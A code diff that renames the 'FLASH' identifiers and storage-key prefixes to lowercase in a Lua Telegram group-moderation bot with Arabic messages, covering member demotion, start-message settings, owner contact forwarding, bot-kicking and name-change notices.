-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ العضو ( ['..result.title_..'](t.me/'..(text1[3] or 'FAQY4')..')'..' )\n❅∫ تم تنزيله من ( '..text1[2]..' )\n❅∫ بواسطه ( '..renk_FLASH(msg)..' )\n', 1, 'md')
-FLASHdx1:srem(FLASH..'bot:vipmem:'..msg.chat_id_, result.id_)
-FLASHdx1:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ العضو ( ['..result.title_..'](t.me/'..(text1[3] or 'FAQY4')..')'..' )\n❅∫ تم تنزيله من ( '..text1[2]..' )\n❅∫ بواسطه ( '..renk_flash(msg)..' )\n', 1, 'md')
+flashdx1:srem(flash..'bot:vipmem:'..msg.chat_id_, result.id_)
+flashdx1:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
 elseif fdrt == "ادمن" and is_owner(msg.sender_user_id_, msg.chat_id_) then 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ العضو ( ['..result.title_..'](t.me/'..(text1[3] or 'FAQY4')..')'..' )\n❅∫ تم تنزيله من ( '..text1[2]..' )\n❅∫ بواسطه ( '..renk_FLASH(msg)..' )\n', 1, 'md')
-FLASHdx1:srem(FLASH..'bot:momod:'..msg.chat_id_, result.id_)
-FLASHdx1:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ العضو ( ['..result.title_..'](t.me/'..(text1[3] or 'FAQY4')..')'..' )\n❅∫ تم تنزيله من ( '..text1[2]..' )\n❅∫ بواسطه ( '..renk_flash(msg)..' )\n', 1, 'md')
+flashdx1:srem(flash..'bot:momod:'..msg.chat_id_, result.id_)
+flashdx1:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
 elseif fdrt == "مدير" and is_monsh(msg.sender_user_id_, msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ العضو ( ['..result.title_..'](t.me/'..(text1[3] or 'FAQY4')..')'..' )\n❅∫ تم تنزيله من ( '..text1[2]..' )\n❅∫ بواسطه ( '..renk_FLASH(msg)..' )\n', 1, 'md')
-FLASHdx1:srem(FLASH..'bot:owners:'..msg.chat_id_, result.id_)
-FLASHdx1:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ العضو ( ['..result.title_..'](t.me/'..(text1[3] or 'FAQY4')..')'..' )\n❅∫ تم تنزيله من ( '..text1[2]..' )\n❅∫ بواسطه ( '..renk_flash(msg)..' )\n', 1, 'md')
+flashdx1:srem(flash..'bot:owners:'..msg.chat_id_, result.id_)
+flashdx1:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
 elseif fdrt == "عضو" and is_momod(msg.sender_user_id_, msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ العضو ( ['..result.title_..'](t.me/'..(text1[3] or 'FAQY4')..')'..' )\n❅∫ تم تنزيله من ( '..text1[2]..' )\n❅∫ بواسطه ( '..renk_FLASH(msg)..' )\n', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ العضو ( ['..result.title_..'](t.me/'..(text1[3] or 'FAQY4')..')'..' )\n❅∫ تم تنزيله من ( '..text1[2]..' )\n❅∫ بواسطه ( '..renk_flash(msg)..' )\n', 1, 'md')
 end else
 info = "❅∫ المعرف غير صحيح"
-FLASHdx(msg.chat_id_, msg.id_, 1, info, 1, 'html')
+flashdx(msg.chat_id_, msg.id_, 1, info, 1, 'html')
 end end
 tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if msg.chat_id_ then
 local id = tostring(msg.chat_id_)
 if id:match("-100(%d+)") then
-FLASHdx1:incr(FLASH..'msg'..msg.chat_id_..':'..msg.sender_user_id_) 
+flashdx1:incr(flash..'msg'..msg.chat_id_..':'..msg.sender_user_id_) 
 Chat_Type = 'arg' 
 elseif id:match("^(%d+)") then
-FLASHdx1:sadd(FLASH..'bot',msg.sender_user_id_)  
+flashdx1:sadd(flash..'bot',msg.sender_user_id_)  
 Chat_Type = 'pv' 
 else
 Chat_Type = 'sup' 
 end end 
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if Chat_Type == 'pv' then 
 if text == '/start' then   
 function adding(extra,result,success)
-local users = FLASHdx1:scard(FLASH.."bot:userss")
-FLASHdx(tostring((FLASHdx1:get(FLASH.."bot:leader:gr") or bot_owner)), 0, 1, "❅∫  هذا دز ستارت للبوت \n❅∫ معرفه ⌯» @"..(result.username_ or "لا يوجد").."\n❅∫ ايديه ⌯» {"..msg.sender_user_id_.."}\n❅∫ اصبح عدد المشتركين { "..users.." }" , 1, 'html')
+local users = flashdx1:scard(flash.."bot:userss")
+flashdx(tostring((flashdx1:get(flash.."bot:leader:gr") or bot_owner)), 0, 1, "❅∫  هذا دز ستارت للبوت \n❅∫ معرفه ⌯» @"..(result.username_ or "لا يوجد").."\n❅∫ ايديه ⌯» {"..msg.sender_user_id_.."}\n❅∫ اصبح عدد المشتركين { "..users.." }" , 1, 'html')
 end 
 getUser(msg.sender_user_id_,adding) 
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if Chat_Type == 'pv' then 
 if text and text:match("/start hms(.*)_(%d+)") then 
 function adding(extra,result,success)
-FLASHdx(tostring((FLASHdx1:get(FLASH.."bot:leader:gr") or bot_owner)), 0, 1, "❅∫ هذا دزوله همسه وديشوفها \n❅∫ معرفه ⌯» @"..(result.username_ or "لا يوجد").."\n❅∫ ايديه ⌯» {"..msg.sender_user_id_.."}" , 1, 'html') 
+flashdx(tostring((flashdx1:get(flash.."bot:leader:gr") or bot_owner)), 0, 1, "❅∫ هذا دزوله همسه وديشوفها \n❅∫ معرفه ⌯» @"..(result.username_ or "لا يوجد").."\n❅∫ ايديه ⌯» {"..msg.sender_user_id_.."}" , 1, 'html') 
 end 
 getUser(msg.sender_user_id_,adding) 
 end end 
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if Chat_Type == 'pv' then 
-if text == '/start' or text == 'رجوع ،🔙‘' and FLASH11(msg) then    
+if text == '/start' or text == 'رجوع ،🔙‘' and flash11(msg) then    
 if is_leader(msg) then
 local Sudo_Welcome = '*❅∫ اهلا بك عزيزي المطور الاساسي \n❅∫ اليك اوامر الكيبورد الخاص بسورس فلاش*'
 local key = {
@@ -1368,9 +1368,9 @@ local key = {
 send_inline(msg.chat_id_,Sudo_Welcome,key)
 return false
 end end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if Chat_Type == 'pv' then
-if text == 'اوامر الاذاعات' and FLASH11(msg) then  
+if text == 'اوامر الاذاعات' and flash11(msg) then  
 if is_leader(msg) then 
 local Sudo_Welcome = '❅∫ اهلا بك مره اخرى عزيزي المطور \n❅∫ اليك ازرار خدمه الاذاعات\n❅∫ ملاحظه : امر ( توجيه للكل ) يجب ان يكون بالرد'
 local key = {
@@ -1382,9 +1382,9 @@ local key = {
 send_inline(msg.chat_id_,Sudo_Welcome,key)
 return false
 end end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if Chat_Type == 'pv' then 
-if text == 'اوامر بوت التواصل' and FLASH11(msg) then  
+if text == 'اوامر بوت التواصل' and flash11(msg) then  
 if is_leader(msg) then 
 local Sudo_Welcome = '❅∫ اهلا بك مره اخرى عزيزي المطور \n❅∫ اليك ازرار خدمه بوت التواصل'
 local key = {
@@ -1395,9 +1395,9 @@ local key = {
 send_inline(msg.chat_id_,Sudo_Welcome,key)
 return false
 end end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
  if Chat_Type == 'pv' then 
-if text == 'اوامر الخدمه' and FLASH11(msg) then    
+if text == 'اوامر الخدمه' and flash11(msg) then    
 local Sudo_Welcome = '❅∫ يمكنك ايضا استخدام الاوامر الخدميه \n❅∫ اليك ازرار الاوامر الخدميه'
 local key = {
 {'زخرفه','احسب عمرك'},
@@ -1417,11 +1417,11 @@ local key = {
 send_inline(msg.chat_id_,Sudo_Welcome,key)
 return false
 end end 
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if Chat_Type == 'pv' then
-if text == '/start' and FLASH11(msg) then    
-if not FLASHdx1:get(FLASH..'Start:Time'..msg.sender_user_id_) then
-local inline = {{{text="المطور",url="t.me/"..(SudoFLASH or "FAQY4")}}}
+if text == '/start' and flash11(msg) then    
+if not flashdx1:get(flash..'Start:Time'..msg.sender_user_id_) then
+local inline = {{{text="المطور",url="t.me/"..(Sudoflash or "FAQY4")}}}
 local Sudo_Welcome = '❅∫ يمكنك ايضا استخدام الاوامر الخدميه \n❅∫ اليك ازرار الاوامر الخدميه اسفل الرساله\n                  • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n                              [𝐅𝐀𝐄𝐃𝐄𝐑 - 𝐂𝐇](https://t.me/FAQY4)'
 local key = {
 {'زخرفه','احسب عمرك'},
@@ -1438,7 +1438,7 @@ local key = {
 {'انكليزي','رياضيات'},
 {'رجوع ،🔙‘'},
 }
-local start = FLASHdx1:get(FLASH.."Start:Bot")
+local start = flashdx1:get(flash.."Start:Bot")
 if start then 
 Start_Source = start
 else
@@ -1447,49 +1447,49 @@ end
 send_inline(msg.chat_id_,Start_Source,nil,inline)
 send_inline(msg.chat_id_,Sudo_Welcome,key)
 end
-FLASHdx1:setex(FLASH..'Start:Time'..msg.sender_user_id_,300,true)
+flashdx1:setex(flash..'Start:Time'..msg.sender_user_id_,300,true)
 return false
 end end
-if text and FLASHdx1:get(FLASH..'Start:Bots') then
+if text and flashdx1:get(flash..'Start:Bots') then
 if text == 'الغاء' then   
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم الغاء حفظ كليشة الستارت .', 1, 'md')
-FLASHdx1:del(FLASH..'Start:Bots') 
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم الغاء حفظ كليشة الستارت .', 1, 'md')
+flashdx1:del(flash..'Start:Bots') 
 return false
 end
-FLASHdx1:set(FLASH.."Start:Bot",text)  
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم حفظ كليشة الستارت .', 1, 'md')
-FLASHdx1:del(FLASH..'Start:Bots') 
+flashdx1:set(flash.."Start:Bot",text)  
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم حفظ كليشة الستارت .', 1, 'md')
+flashdx1:del(flash..'Start:Bots') 
 return false
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_leader(msg) then
 if text == 'تعيين رد الخاص' or text == 'ضع كليشه ستارت' or text == ' تعيين رد الخاص ⌁' then 
-FLASHdx1:set(FLASH..'Start:Bots',true) 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ ارسل لي كليشه ستارت جديده .', 1, 'md')
+flashdx1:set(flash..'Start:Bots',true) 
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ ارسل لي كليشه ستارت جديده .', 1, 'md')
 return false 
 end
 if text == 'حذف رد الخاص' or text == 'حذف كليشه ستارت' or text == 'مسح رد الخاص' or text == 'مسح كليشه ستارت' then  
-FLASHdx1:del(FLASH..'Start:Bot') 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم مسح كليشه الستارت .', 1, 'md')
+flashdx1:del(flash..'Start:Bot') 
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم مسح كليشه الستارت .', 1, 'md')
 end
 if text == 'جلب رد الخاص' or text == 'جلب كليشه ستارت' then    
-local start = FLASHdx1:get(FLASH.."Start:Bot")
+local start = flashdx1:get(flash.."Start:Bot")
 if start then 
 Start_Source = start
 else
 Start_Source = "❅∫ مرحبا انا بوت اسمي { "..name_bot.." }\n❅∫ اختصاصي حماية المجموعات\n❅∫ من التفليش والسبام والخخ .. . ،\n❅∫ قم برفعي ادمن في مجموعتك وارسل ( تفعيل )\n❅∫ سيتم رفع الادمنيه والمنشئ تلقائيا"
 end
-FLASHdx(msg.chat_id_, msg.id_, 1, Start_Source, 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, Start_Source, 1, 'md')
 return false
 end end
---     By Developer FLASH     -- 
-if text == 'احسب عمرك' then FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ من خلال البوت يمكنك حساب عمرك ،\n❅∫ فقط قم بارسال امر احسب + مواليدك الى البوت ،\n❅∫ بالتنسيق التالي مثال : احسب 1996/1/17', 1, 'md') end
-if text == 'الابراج' then FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ من خلال البوت يمكنك معرفه توقعات برجك ،\n❅∫ فقط قم بارسال امر برج + اسم البرج ،\n❅∫ مثال : برج الدلو ،\n❅∫ لمعرفه برجك قم بالرجوع الى قسم حساب العمر ،', 1, 'md') end
-if text == 'قسم الحمايه' then FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ اضف البوت في المجموعه وارسل تفعيل ،\n❅∫ وتمتع بخدمات غير مطروقه ،', 1, 'md') end
-if text == '•┉ • ┉ • ┉ • ┉ • ┉•' then FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ اختر لعبه من الكيبورد بالاسفل ،', 1, 'md') end
+--     By Developer flash     -- 
+if text == 'احسب عمرك' then flashdx(msg.chat_id_, msg.id_, 1, '❅∫ من خلال البوت يمكنك حساب عمرك ،\n❅∫ فقط قم بارسال امر احسب + مواليدك الى البوت ،\n❅∫ بالتنسيق التالي مثال : احسب 1996/1/17', 1, 'md') end
+if text == 'الابراج' then flashdx(msg.chat_id_, msg.id_, 1, '❅∫ من خلال البوت يمكنك معرفه توقعات برجك ،\n❅∫ فقط قم بارسال امر برج + اسم البرج ،\n❅∫ مثال : برج الدلو ،\n❅∫ لمعرفه برجك قم بالرجوع الى قسم حساب العمر ،', 1, 'md') end
+if text == 'قسم الحمايه' then flashdx(msg.chat_id_, msg.id_, 1, '❅∫ اضف البوت في المجموعه وارسل تفعيل ،\n❅∫ وتمتع بخدمات غير مطروقه ،', 1, 'md') end
+if text == '•┉ • ┉ • ┉ • ┉ • ┉•' then flashdx(msg.chat_id_, msg.id_, 1, '❅∫ اختر لعبه من الكيبورد بالاسفل ،', 1, 'md') end
 if Chat_Type == 'pv' then   
-if not is_leader(msg) and not FLASHdx1:sismember(FLASH..'BaN:In:User',msg.sender_user_id_) and not FLASHdx1:get(FLASH..'Texting:In:Bv') then
-FLASHdx(msg.sender_user_id_, msg.id_, 1, '❅∫ تم ارسال رسالتك الى [مطور البوت](t.me/'..SudoFLASH..')', 1, 'md')
+if not is_leader(msg) and not flashdx1:sismember(flash..'BaN:In:User',msg.sender_user_id_) and not flashdx1:get(flash..'Texting:In:Bv') then
+flashdx(msg.sender_user_id_, msg.id_, 1, '❅∫ تم ارسال رسالتك الى [مطور البوت](t.me/'..Sudoflash..')', 1, 'md')
 tdcli_function({ID ="GetChat",chat_id_=bot_owner},function(arg,chat)  
 tdcli_function({ID ="GetChat",chat_id_=msg.sender_user_id_},function(arg,chat)  
 tdcli_function({ID="ForwardMessages",chat_id_=bot_owner,from_chat_id_= msg.sender_user_id_,message_ids_={[0]=msg.id_},disable_notification_=1,from_background_=1},function(arg,data) 
@@ -1508,23 +1508,23 @@ tdcli_function ({ID = "GetUser",user_id_ = id_user},function(arg,data)
 if text == 'حظر' then
 local Text = '❅∫ تم حظره من التواصل بنجاح .'
 sendText(bot_owner,Text,msg.id_/2097152/0.5,'md') 
-FLASHdx1:sadd(FLASH..'BaN:In:User',data.id_)  
+flashdx1:sadd(flash..'BaN:In:User',data.id_)  
 return false  
 end 
 if text == 'الغاء الحظر' or text == 'الغاء حظر' then 
 local Text = '❅∫ تم الغاء حظره من التواصل بنجاح .'
 sendText(bot_owner,Text,msg.id_/2097152/0.5,'md') 
-FLASHdx1:srem(FLASH..'BaN:In:User',data.id_)  
+flashdx1:srem(flash..'BaN:In:User',data.id_)  
 return false 
 end 
 tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
 tdcli_function ({ ID = "SendChatAction",chat_id_ = id_user, action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,dp) 
 if dp.code_ == 400 or dp.code_ == 5 then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لم يتم ارسال رسالتك لان العظو قام بحظر البوت .', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لم يتم ارسال رسالتك لان العظو قام بحظر البوت .', 1, 'md')
 return false  
 end  
 if text then
-FLASHdx(id_user, 0, 1, text, 1, "md")  
+flashdx(id_user, 0, 1, text, 1, "md")  
 Text = '❅∫ تم ارسال الرساله الى ،'
 elseif msg.content_.ID == 'MessageSticker' then    
 sendSticker(id_user, msg.id_, 0, 1,nil, msg.content_.sticker_.sticker_.persistent_id_)   
@@ -1543,22 +1543,22 @@ sendText(bot_owner, Text..'\n'..'['..string.sub(data.first_name_,0, 40)..'](tg:/
 end,nil); end,nil); end,nil); end,nil); end end 
 if is_leader(msg) then
 if text == 'تفعيل التواصل' then   
-local FLASH = '❅∫ اهلا عزيزي '..renk_FLASH(msg)..'\n❅∫ تم تفعيل التواصل .'
-FLASHdx(msg.chat_id_, msg.id_, 1,FLASH, 1, 'md') 
-FLASHdx1:del(FLASH..'Texting:In:Bv') 
+local flash = '❅∫ اهلا عزيزي '..renk_flash(msg)..'\n❅∫ تم تفعيل التواصل .'
+flashdx(msg.chat_id_, msg.id_, 1,flash, 1, 'md') 
+flashdx1:del(flash..'Texting:In:Bv') 
 end
 if text == 'تعطيل التواصل' then  
-local FLASH = '❅∫ اهلا عزيزي '..renk_FLASH(msg)..'\n❅∫ تم تعطيل التواصل .'
-FLASHdx(msg.chat_id_, msg.id_, 1,FLASH, 1, 'md') 
-FLASHdx1:set(FLASH..'Texting:In:Bv',true) 
+local flash = '❅∫ اهلا عزيزي '..renk_flash(msg)..'\n❅∫ تم تعطيل التواصل .'
+flashdx(msg.chat_id_, msg.id_, 1,flash, 1, 'md') 
+flashdx1:set(flash..'Texting:In:Bv',true) 
 end end
---     By Developer FLASH     -- 
-FLASHdx1:sadd(FLASH.."groups:users" .. msg.chat_id_, msg.sender_user_id_)--save users gp
-FLASHdx1:incr(FLASH.."msgs:"..msg.sender_user_id_..":"..msg.chat_id_.."")--save msgs gp
+--     By Developer flash     -- 
+flashdx1:sadd(flash.."groups:users" .. msg.chat_id_, msg.sender_user_id_)--save users gp
+flashdx1:incr(flash.."msgs:"..msg.sender_user_id_..":"..msg.chat_id_.."")--save msgs gp
 if msg.content_.ID == "MessageChatDeleteMember" then
 if tonumber(msg.content_.user_.id_) == tonumber(bot_id) then
-FLASHdx1:del(FLASH.."bot:enable:" .. msg.chat_id_)
-FLASHdx1:srem(FLASH.."bot:groups", msg.chat_id_) 
+flashdx1:del(flash.."bot:enable:" .. msg.chat_id_)
+flashdx1:srem(flash.."bot:groups", msg.chat_id_) 
 end end 
 function chek_admin(chat_id,set) 
 local function promote_admin(extra,result,success)   
@@ -1568,7 +1568,7 @@ getChannelMembers(chat_id, 0, 'Administrators', limit,set)
 end end
 getChannelFull(chat_id,promote_admin)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function channel_get_kicked(channel,cb)
 local function callback_admins(extra,result,success)
 limit = result.kicked_count_
@@ -1576,7 +1576,7 @@ getChannelMembers(channel, 0, 'Kicked', limit,cb)
 end
 getChannelFull(channel,callback_admins)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function deleteMessagesFromUser(chat_id, user_id)
 tdcli_function ({
 ID = "DeleteMessagesFromUser",
@@ -1584,7 +1584,7 @@ chat_id_ = chat_id,
 user_id_ = user_id
 }, dl_cb, nil)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function forwardMessages(chat_id, from_chat_id, message_ids, disable_notification)
 tdcli_function ({
 ID = "ForwardMessages",
@@ -1595,141 +1595,141 @@ disable_notification_ = disable_notification,
 from_background_ = 1
 }, dl_cb, nil)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 function getUser(user_id, cb)
 tdcli_function ({
 ID = "GetUser",
 user_id_ = user_id
 }, cb, nil)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 local msg = data.message_
 text = msg.content_.text_
-if text and not FLASHdx1:get(FLASH..'lock:bot:ttt'..bot_id) and not FLASHdx1:get(FLASH.."lock:bot:ttt2:"..msg.chat_id_) then 
-function FLASH(extra,result,success)
+if text and not flashdx1:get(flash..'lock:bot:ttt'..bot_id) and not flashdx1:get(flash.."lock:bot:ttt2:"..msg.chat_id_) then 
+function flash(extra,result,success)
 if result.id_ then 
-local dx = FLASHdx1:get("FLASH:name"..result.id_)
+local dx = flashdx1:get("flash:name"..result.id_)
 if not result.first_name_ then 
 if dx then 
-FLASHdx1:del("FLASH:name"..result.id_) 
+flashdx1:del("flash:name"..result.id_) 
 end end
 if result.first_name_ then 
 if dx and dx ~= result.first_name_ then 
-local FLASH_text = {
+local flash_text = {
   "اسمك الجديد { "..result.first_name_.." }\n ليش غيرته 🌚😹",
   "اسمك الجديد { "..result.first_name_.." }\n مو حلو رجعه القديم ☹️👌",
   "ليش غيرت اسمك { "..result.first_name_.." }\n قطيت احد حبي ؟ 🌚😹",
   "اسمك الجديد يخبل ضلعي 🤭😹{ "..result.first_name_.." }", 
 }
-dxx = math.random(#FLASH_text)
-FLASHdx(msg.chat_id_, msg.id_, 1, FLASH_text[dxx], 1, 'html')
+dxx = math.random(#flash_text)
+flashdx(msg.chat_id_, msg.id_, 1, flash_text[dxx], 1, 'html')
 end  
-FLASHdx1:set("FLASH:name"..result.id_, result.first_name_)  
+flashdx1:set("flash:name"..result.id_, result.first_name_)  
 end end end
-getUser(msg.sender_user_id_, FLASH)
+getUser(msg.sender_user_id_, flash)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 local msg = data.message_
 text = msg.content_.text_
 if msg.content_.ID == "MessageChatAddMembers" then  
-FLASHdx1:set(FLASH.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
+flashdx1:set(flash.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 local msg = data.message_
 text = msg.content_.text_
 if msg.content_.ID == "MessageChatAddMembers" then  
 local mem_id = msg.content_.members_  
 for i=0,#mem_id do  
-if msg.content_.members_[i].type_.ID == "UserTypeBot" and FLASHdx1:get(FLASH.."bot:bots:ban" .. msg.chat_id_) and not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
+if msg.content_.members_[i].type_.ID == "UserTypeBot" and flashdx1:get(flash.."bot:bots:ban" .. msg.chat_id_) and not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
 chat_kick(msg.chat_id_,mem_id[i].id_)
 chat_kick(msg.chat_id_, msg.sender_user_id_)
 end end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if msg.content_.ID == "MessageChatAddMembers" then  
 local mem_id = msg.content_.members_  
 for i=0,#mem_id do  
-if msg.content_.members_[i].type_.ID == "UserTypeBot" and FLASHdx1:get(FLASH.."bot:bots:mute" .. msg.chat_id_) and not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
+if msg.content_.members_[i].type_.ID == "UserTypeBot" and flashdx1:get(flash.."bot:bots:mute" .. msg.chat_id_) and not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
 chat_kick(msg.chat_id_,mem_id[i].id_)
 end end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if msg.content_.ID == "MessageChatAddMembers" then  
 local mem_id = msg.content_.members_  
 for i=0,#mem_id do  
-if msg.content_.members_[i].type_.ID == "UserTypeBot" and FLASHdx1:get(FLASH.."keed_bots"..msg.chat_id_)  and not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
+if msg.content_.members_[i].type_.ID == "UserTypeBot" and flashdx1:get(flash.."keed_bots"..msg.chat_id_)  and not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
 chat_kick(msg.chat_id_,mem_id[i].id_)
-FLASHdx1:sadd(FLASH..'bot:keed:'..msg.chat_id_, msg.sender_user_id_)
+flashdx1:sadd(flash..'bot:keed:'..msg.chat_id_, msg.sender_user_id_)
 HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false")
-FLASHdx1:sadd(FLASH..'bot:keed:'..msg.chat_id_, msg.sender_user_id_)
+flashdx1:sadd(flash..'bot:keed:'..msg.chat_id_, msg.sender_user_id_)
 end end end
---     By Developer FLASH     -- 
-if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(FLASH) then 
-FLASHdx1:srem("FLASH:addg"..bot_id, msg.chat_id_) 
-FLASHdx1:del(FLASH.."bot:charge:"..msg.chat_id_)
-function FLASH(extra,result,success) 
+--     By Developer flash     -- 
+if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(flash) then 
+flashdx1:srem("flash:addg"..bot_id, msg.chat_id_) 
+flashdx1:del(flash.."bot:charge:"..msg.chat_id_)
+function flash(extra,result,success) 
 function  reslit(f1,f2)
-function FLASH333(t1,t2)
+function flash333(t1,t2)
 tdcli_function ({ ID = "GetChat", chat_id_ = bot_owner },function(arg,chat)  
-FLASHdx(tostring((FLASHdx1:get(FLASH.."bot:leader:gr") or bot_owner)), 0, 1, "❅∫ تم طرد البوت من مجموعه  \n❅∫ معرف العضو ⌯» @"..(result.username_ or "لا يوجد").."\n❅∫ ايدي العضو ⌯» `"..msg.sender_user_id_.."`\n❅∫ معلومات المجموعه ،  \n\n❅∫ اسم المجموعه ⌯»  *"..f2.title_.."*\n❅∫ ايدي المجموعه ⌯» `"..msg.chat_id_.."`\n❅∫ رابط المجموعه ، \n❅∫ تم مسح جميع بياناتها\n" , 1, 'md')
+flashdx(tostring((flashdx1:get(flash.."bot:leader:gr") or bot_owner)), 0, 1, "❅∫ تم طرد البوت من مجموعه  \n❅∫ معرف العضو ⌯» @"..(result.username_ or "لا يوجد").."\n❅∫ ايدي العضو ⌯» `"..msg.sender_user_id_.."`\n❅∫ معلومات المجموعه ،  \n\n❅∫ اسم المجموعه ⌯»  *"..f2.title_.."*\n❅∫ ايدي المجموعه ⌯» `"..msg.chat_id_.."`\n❅∫ رابط المجموعه ، \n❅∫ تم مسح جميع بياناتها\n" , 1, 'md')
 end,nil)   
 end
 tdcli_function ({
 ID = "GetChannelFull",
 channel_id_ = getChatId(msg.chat_id_).ID
-}, FLASH333, nil)
+}, flash333, nil)
 end
 tdcli_function ({
 ID = "GetChat",
 chat_id_ = msg.chat_id_
 }, reslit, nil) 
 end
-getUser(msg.sender_user_id_, FLASH)
+getUser(msg.sender_user_id_, flash)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == 'MessagePinMessage' or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == 'MessageChatChangeTitle' or msg.content_.ID == "MessageChatDeleteMember" then   
-if FLASHdx1:get(FLASH..'bot:tgservice:jk'..msg.chat_id_) then
+if flashdx1:get(flash..'bot:tgservice:jk'..msg.chat_id_) then
 local id = msg.id_
 local msgs = {[0] = id}
 local chat = msg.chat_id_
 delete_msg(chat,msgs)    
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 local msg = data.message_
 text = msg.content_.text_
-if text and not FLASHdx1:get(FLASH..'lock:bot:ttt'..bot_id) and not FLASHdx1:get(FLASH.."lock:bot:ttt2:"..msg.chat_id_) then  
-function FLASH(extra,result,success)
+if text and not flashdx1:get(flash..'lock:bot:ttt'..bot_id) and not flashdx1:get(flash.."lock:bot:ttt2:"..msg.chat_id_) then  
+function flash(extra,result,success)
 if result.id_ then 
-local dx = FLASHdx1:get("FLASH:Userr"..result.id_)
+local dx = flashdx1:get("flash:Userr"..result.id_)
 if not result.username_ then 
 if dx then 
-FLASHdx(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه : @"..dx, 1, 'html')
-FLASHdx1:del("FLASH:Userr"..result.id_) 
+flashdx(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه : @"..dx, 1, 'html')
+flashdx1:del("flash:Userr"..result.id_) 
 end end
 if result.username_ then 
 if dx and dx ~= result.username_ then 
-local FLASH_text = {
+local flash_text = {
   'كمشتك ليش غيرت معرفك ولك 😹',
   "ليش غيرت معرف طشوك بقنات انحراف ؟ ⛷😹",
   "حلو معرفك الجديد منين خمطته 😹",
   "لحكو غير معرفه خمطو \n هذا معرفه القديم 🌚😹 @"..result.username_.."",
 }
-dxx = math.random(#FLASH_text)
-FLASHdx(msg.chat_id_, msg.id_, 1, FLASH_text[dxx], 1, 'html')
+dxx = math.random(#flash_text)
+flashdx(msg.chat_id_, msg.id_, 1, flash_text[dxx], 1, 'html')
 end  
-FLASHdx1:set("FLASH:Userr"..result.id_, result.username_) 
+flashdx1:set("flash:Userr"..result.id_, result.username_) 
 end end end
-getUser(msg.sender_user_id_, FLASH)
+getUser(msg.sender_user_id_, flash)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 local msg = data.message_
 text = msg.content_.text_
